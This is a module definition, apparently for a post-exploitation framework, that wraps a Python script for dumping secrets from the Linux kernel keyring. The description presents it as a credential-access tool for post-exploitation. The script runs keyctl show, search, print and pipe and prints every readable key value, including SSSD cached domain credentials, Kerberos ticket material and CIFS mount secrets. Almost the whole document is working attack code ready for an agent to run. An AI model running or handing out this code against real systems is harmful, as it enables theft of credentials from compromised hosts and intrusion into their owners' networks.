name: linux_keyring
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Reads potential secrets from the Linux kernel keyring subsystem using keyctl.
  Kernel keyrings are commonly used by SSSD for cached domain credentials, Kerberos for ticket cache material, and CIFS for mount authentication data.
  Access to key data outside the current security context typically requires root privileges or capabilities such as CAP_SYS_PTRACE.
  This is an often-overlooked credential source during Linux post-exploitation and credential access operations.
software: ''
tactics: [TA0006]
techniques: [T1552.001]
background: false
output_extension: ''
needs_admin: true
opsec_safe: true
language: python
min_language_version: '2.6'
comments:
  - https://man7.org/linux/man-pages/man7/keyrings.7.html
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: KeyringID
    description: Keyring to enumerate (user, session, process, or specific ID).
    required: false
    value: 'session'
    suggested_values:
      - user
      - session
      - process
  - name: SearchType
    description: Type of keys to search for.
    required: false
    value: ''
    suggested_values:
      - user
      - logon
      - keyring
      - big_key
script: |
  import re
  import subprocess

  def run_keyring():
      keyring_input = '{{ KeyringID }}'.strip()
      search_type = '{{ SearchType }}'.strip()

      keyring_aliases = {
          'user': '@u',
          'session': '@s',
          'process': '@p',
          '@u': '@u',
          '@s': '@s',
          '@p': '@p',
      }

      if keyring_input:
          lower_keyring = keyring_input.lower()
          if lower_keyring in keyring_aliases:
              keyring_target = keyring_aliases[lower_keyring]
          else:
              keyring_target = keyring_input
      else:
          keyring_target = '@s'

      print('[*] Linux keyring enumeration')
      print('[*] Target keyring: %s' % keyring_target)

      try:
          version_proc = subprocess.Popen(
              ['keyctl', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE
          )
          version_stdout, version_stderr = version_proc.communicate()
      except OSError:
          print('[!] keyctl is not installed or not in PATH')
          return

      if version_proc.returncode != 0:
          print('[!] keyctl is not available: %s' % version_stderr.decode('utf-8', 'ignore').strip())
          return

      show_cmd = ['keyctl', 'show', keyring_target]
      try:
          show_proc = subprocess.Popen(show_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
          show_stdout, show_stderr = show_proc.communicate()
      except Exception as e:
          print('[!] Failed to run keyctl show: %s' % str(e))
          return

      if show_proc.returncode != 0:
          print('[!] Failed to enumerate keyring %s: %s' % (
              keyring_target,
              show_stderr.decode('utf-8', 'ignore').strip(),
          ))
          return

      allowed_ids = set()
      if search_type:
          try:
              search_cmd = ['keyctl', 'search', keyring_target, search_type, '']
              search_proc = subprocess.Popen(search_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              search_stdout, search_stderr = search_proc.communicate()
              if search_proc.returncode == 0:
                  for found_id in re.findall(r'\b\d+\b', search_stdout.decode('utf-8', 'ignore')):
                      allowed_ids.add(found_id)
                  if allowed_ids:
                      print('[*] SearchType filter applied: %s (%d key(s) matched)' % (search_type, len(allowed_ids)))
                  else:
                      print('[*] SearchType filter returned no key IDs for type: %s' % search_type)
              else:
                  print('[!] SearchType filter failed for "%s": %s' % (
                      search_type,
                      search_stderr.decode('utf-8', 'ignore').strip(),
                  ))
          except Exception as e:
              print('[!] SearchType filter error: %s' % str(e))

      show_text = show_stdout.decode('utf-8', 'ignore')
      key_lines = []
      for line in show_text.splitlines():
          match = re.match(r'^\s*(?:\\_\s*)?(\d+)\s+\S+\s+\d+\s+\d+\s+([a-zA-Z0-9_]+):\s*(.*)$', line)
          if match:
              key_lines.append((match.group(1), match.group(2), match.group(3).strip()))

      if not key_lines:
          print('[*] No keys found in keyring %s' % keyring_target)
          return

      print('')
      print('[*] Key results')
      print('-' * 80)

      printed = 0
      for key_id, key_type, key_desc in key_lines:
          if allowed_ids and key_id not in allowed_ids:
              continue

          value = None
          try:
              print_proc = subprocess.Popen(['keyctl', 'print', key_id], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              print_stdout, print_stderr = print_proc.communicate()
              if print_proc.returncode == 0:
                  value = print_stdout.decode('utf-8', 'ignore').strip()
              else:
                  pipe_proc = subprocess.Popen(['keyctl', 'pipe', key_id], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                  pipe_stdout, pipe_stderr = pipe_proc.communicate()
                  if pipe_proc.returncode == 0:
                      value = pipe_stdout.decode('utf-8', 'ignore').strip()
                  else:
                      err_text = print_stderr.decode('utf-8', 'ignore').strip()
                      if not err_text:
                          err_text = pipe_stderr.decode('utf-8', 'ignore').strip()
                      value = '[unreadable: %s]' % (err_text if err_text else 'permission denied or unsupported key type')
          except Exception as e:
              value = '[error reading key: %s]' % str(e)

          print('Key ID      : %s' % key_id)
          print('Type        : %s' % key_type)
          print('Description : %s' % key_desc)
          print('Value       : %s' % (value if value else '[empty]'))
          print('-' * 80)
          printed += 1

      if printed == 0 and allowed_ids:
          print('[*] No keys matched SearchType "%s" in keyring %s' % (search_type, keyring_target))

  run_keyring()
